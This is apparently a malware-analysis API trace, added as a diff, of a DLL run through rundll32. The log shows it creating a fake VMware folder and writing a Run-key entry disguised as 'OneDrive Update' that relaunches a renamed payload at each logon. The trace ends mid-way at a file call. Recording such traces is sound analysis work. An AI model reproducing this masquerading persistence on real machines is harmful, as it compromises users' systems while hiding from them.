@@ -1,0 +1,2645 @@
+Creation de Processus, pid [0xaa0] (C:\Windows\System32\rundll32.exe)
+
+Thread created by monitored process : Now monitoring [pid 0xaa0][tid 0xabc]
+
+********** Dumping PEB64 **********
+
+	Path : C:\Windows\system32\rundll32.exe
+	Base : 0x00007FF7574A0000
+	Size : 0x13000
+
+	Path : C:\Windows\SYSTEM32\ntdll.dll
+	Base : 0x00007FF9BDEC0000
+	Size : 0x1ac000
+
+	Path : C:\Windows\system32\KERNEL32.DLL
+	Base : 0x00007FF9BB760000
+	Size : 0x13e000
+
+	Path : C:\Windows\system32\KERNELBASE.dll
+	Base : 0x00007FF9BB0E0000
+	Size : 0x115000
+
+	Path : C:\Windows\system32\USER32.dll
+	Base : 0x00007FF9BCF60000
+	Size : 0x177000
+
+	Path : C:\Windows\system32\msvcrt.dll
+	Base : 0x00007FF9BDA60000
+	Size : 0xaa000
+
+	Path : C:\Windows\system32\imagehlp.dll
+	Base : 0x00007FF9BD0E0000
+	Size : 0x16000
+
+	Path : C:\Windows\system32\SHLWAPI.dll
+	Base : 0x00007FF9BDB10000
+	Size : 0x54000
+
+	Path : C:\Windows\SYSTEM32\combase.dll
+	Base : 0x00007FF9BD5A0000
+	Size : 0x211000
+
+	Path : C:\Windows\system32\GDI32.dll
+	Base : 0x00007FF9BDB70000
+	Size : 0x151000
+
+	Path : C:\Windows\system32\RPCRT4.dll
+	Base : 0x00007FF9BB600000
+	Size : 0x141000
+
+	Path : C:\Windows\system32\IMM32.DLL
+	Base : 0x00007FF9BDCD0000
+	Size : 0x36000
+
+	Path : C:\Windows\system32\MSCTF.dll
+	Base : 0x00007FF9BD310000
+	Size : 0x153000
+
+	Path : C:\Users\user\Desktop\google\cms_data_final.dll
+	Base : 0x00007FF9B1560000
+	Size : 0x77000
+
+	Path : C:\Windows\system32\ADVAPI32.dll
+	Base : 0x00007FF9BCDF0000
+	Size : 0xaa000
+
+	Path : C:\Windows\system32\SHELL32.dll
+	Base : 0x00007FF9BB8C0000
+	Size : 0x1519000
+
+	Path : C:\Windows\SYSTEM32\sechost.dll
+	Base : 0x00007FF9BCEA0000
+	Size : 0x59000
+
+********** End Dump PEB64 **********
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x00007FF9B1571388 ("kernel32.dll")
+[RET] 0x7ff9b1568a93 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15713A8 ("FlsAlloc")
+[RET] 0x7ff9b1568aa6 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15713B8 ("FlsFree")
+[RET] 0x7ff9b1568ac4 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15713C0 ("FlsGetValue")
+[RET] 0x7ff9b1568ae2 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15713D0 ("FlsSetValue")
+[RET] 0x7ff9b1568b00 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15713E0 ("InitializeCriticalSectionEx")
+[RET] 0x7ff9b1568b1e in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571400 ("CreateEventExW")
+[RET] 0x7ff9b1568b3c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571410 ("CreateSemaphoreExW")
+[RET] 0x7ff9b1568b5a in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571428 ("SetThreadStackGuarantee")
+[RET] 0x7ff9b1568b78 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571440 ("CreateThreadpoolTimer")
+[RET] 0x7ff9b1568b96 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571458 ("SetThreadpoolTimer")
+[RET] 0x7ff9b1568bb4 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571470 ("WaitForThreadpoolTimerCallbacks")
+[RET] 0x7ff9b1568bd2 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571490 ("CloseThreadpoolTimer")
+[RET] 0x7ff9b1568bf0 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15714A8 ("CreateThreadpoolWait")
+[RET] 0x7ff9b1568c0e in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15714C0 ("SetThreadpoolWait")
+[RET] 0x7ff9b1568c2c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15714D8 ("CloseThreadpoolWait")
+[RET] 0x7ff9b1568c4a in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15714F0 ("FlushProcessWriteBuffers")
+[RET] 0x7ff9b1568c68 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571510 ("FreeLibraryWhenCallbackReturns")
+[RET] 0x7ff9b1568c86 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571530 ("GetCurrentProcessorNumber")
+[RET] 0x7ff9b1568ca4 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571550 ("GetLogicalProcessorInformation")
+[RET] 0x7ff9b1568cc2 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571570 ("CreateSymbolicLinkW")
+[RET] 0x7ff9b1568ce0 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571588 ("SetDefaultDllDirectories")
+[RET] 0x7ff9b1568cfe in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15715A8 ("EnumSystemLocalesEx")
+[RET] 0x7ff9b1568d1c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15715C0 ("CompareStringEx")
+[RET] 0x7ff9b1568d3a in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15715D0 ("GetDateFormatEx")
+[RET] 0x7ff9b1568d58 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15715E0 ("GetLocaleInfoEx")
+[RET] 0x7ff9b1568d76 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B15715F0 ("GetTimeFormatEx")
+[RET] 0x7ff9b1568d94 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571600 ("GetUserDefaultLocaleName")
+[RET] 0x7ff9b1568db2 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571620 ("IsValidLocaleName")
+[RET] 0x7ff9b1568dd0 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571638 ("LCMapStringEx")
+[RET] 0x7ff9b1568dee in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571648 ("GetCurrentPackageId")
+[RET] 0x7ff9b1568e0c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571660 ("GetTickCount64")
+[RET] 0x7ff9b1568e2a in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571670 ("GetFileInformationByHandleExW")
+[RET] 0x7ff9b1568e48 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1571690 ("SetFileInformationByHandleW")
+[RET] 0x7ff9b1568e66 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetCommandLineA> in [KERNEL32.DLL] 
+[RET] 0x7ff9b15643c5 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetEnvironmentStringsW> in [KERNEL32.DLL] 
+[RET] 0x7ff9b1569d0b in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x0000003DFD86E2E0
+[PAR] int     cchWideChar       : 0x4f5
+[PAR] LPSTR   lpMultiByteStr    : 0x0
+[PAR] int     cbMultiByte       : 0x0
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9b1569d62 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x0000003DFD86E2E0
+[PAR] int     cchWideChar       : 0x4f5
+[PAR] LPSTR   lpMultiByteStr    : 0x0000003DFD86ECE0
+[PAR] int     cbMultiByte       : 0x4f5
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9b1569d9d in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <FreeEnvironmentStringsW> in [KERNEL32.DLL] 
+[PAR] LPWCH penv : 0x0000003DFD86E2E0
+[STR]       -> "=C:=C:\Users\user\Desktop\google"
+[RET] 0x7ff9b1569db5 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetStartupInfoW> in [KERNEL32.DLL] 
+[PAR] LPSTARTUPINFOW lpStartupInfo : 0x0000003DFD70F090
+[RET] 0x7ff9b15685d1 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetACP> in [KERNEL32.DLL] 
+[RET] 0x7ff9b1565c0f in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <IsValidCodePage> in [KERNEL32.DLL] 
+[RET] 0x7ff9b156623c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x7ff9b1566251 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x7ff9b1565d14 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x0000003DFD70EAE0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7ff9b156aebc in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x0000003DFD70EAE0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0000003DFD70E7C0
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7ff9b156af7c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetStringTypeW> in [KERNEL32.DLL] 
+[RET] 0x7ff9b156af93 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x0000003DFD70EAE0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7ff9b156ab75 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x0000003DFD70EAE0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0000003DFD70E7B0
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7ff9b156ac26 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x7ff9b156b17c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x7ff9b156b17c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x0000003DFD70E5A0
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x0000003DFD70EBE0
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9b156ad74 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x0000003DFD70EAE0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7ff9b156ab75 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x0000003DFD70EAE0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0000003DFD70E7B0
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7ff9b156ac26 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x7ff9b156b17c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <LCMapStringEx> in [KERNEL32.DLL] 
+[RET] 0x7ff9b156b17c in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x0000003DFD70E5A0
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x0000003DFD70ECE0
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9b156ad74 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetModuleFileNameA> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : NULL. (Try to get current .exe's path)
+[PAR] LPSTR   lpFilename : 0x00007FF9B15D2980
+[PAR] DWORD   nSize      : 0x104
+[RET] 0x7ff9b1569884 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <CommandLineToArgvW> in [SHELL32.dll] 
+[PAR] LPCWSTR lpCmdLine : 0x0000003DFD86606E
+[STR]         -> "Bx9yb37GEcJNK6bt 4901"
+[PAR] int     *pNumArgs : 0x0000003DFD70F340
+[RET] 0x7ff9b1563a64 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x200 (WC_COMPOSITECHECK)
+[PAR] LPCWSTR lpWideCharStr     : 0x0000003DFD70F570
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x0000003DFD70F350
+[PAR] int     cbMultiByte       : 0x10
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9b1563b0b in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x200 (WC_COMPOSITECHECK)
+[PAR] LPCWSTR lpWideCharStr     : 0x0000003DFD70F780
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x0000003DFD70F460
+[PAR] int     cbMultiByte       : 0x4
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9b1563b54 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <CreateDirectoryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpPathName : 0x0000003DFD70EDF0
+[STR]         -> "C:\\ProgramData\\VMware"
+[RET] 0x7ff9b15636c0 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x00007FF9B1575498 ("ntdll")
+[RET] 0x7ff9b156321b in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BDEC0000 ("ntdll.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FF9B1575478 ("NtQuerySystemInformation")
+[RET] 0x7ff9b156322b in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0
+[PAR] SIZE_T dwSize       : 0x100000
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9b1563256 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <RtlGetNativeSystemInformation> in [ntdll.dll] 
+[RET] 0x7ff9b1563270 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x80000001 (HKEY_CURRENT_USER)
+[PAR] LPCTSTR lpSubKey   : 0x0000003DFD70EE78
+[STR]         -> "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x20006 (KEY_WRITE)
+[PAR] PHKEY   phkResult  : 0x0000003DFD70CD00
+[RET] 0x7ff9b156383a in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <RegSetValueExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0xf0 
+[PAR] LPCTSTR lpValueName : 0x0000003DFD70EDB0
+[STR]         -> "OneDrive Update"
+[PAR] DWORD   dwType      : 0x1 (REG_SZ)
+[PAR] BYTE    *lpData     : 0x0000003DFD70EEE0
+            -> 0x0000003DFD70EEE0
+[STR] -> "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\VMware\\vmnat-update.bin,OCSP_resp_find lxUi5CZ0IV45j89Y 4901"
+[RET] 0x7ff9b1563879 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[PAR] HKEY hKey : 0xf0
+[RET] 0x7ff9b1563888 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <LocalAlloc> in [KERNEL32.DLL] 
+[PAR] UINT   uFlags : 0x40
+[PAR] SIZE_T uBytes : 0x370050
+[RET] 0x7ff9b15638d4 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <CreateFileA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName            : 0x0000003DFD70EE10
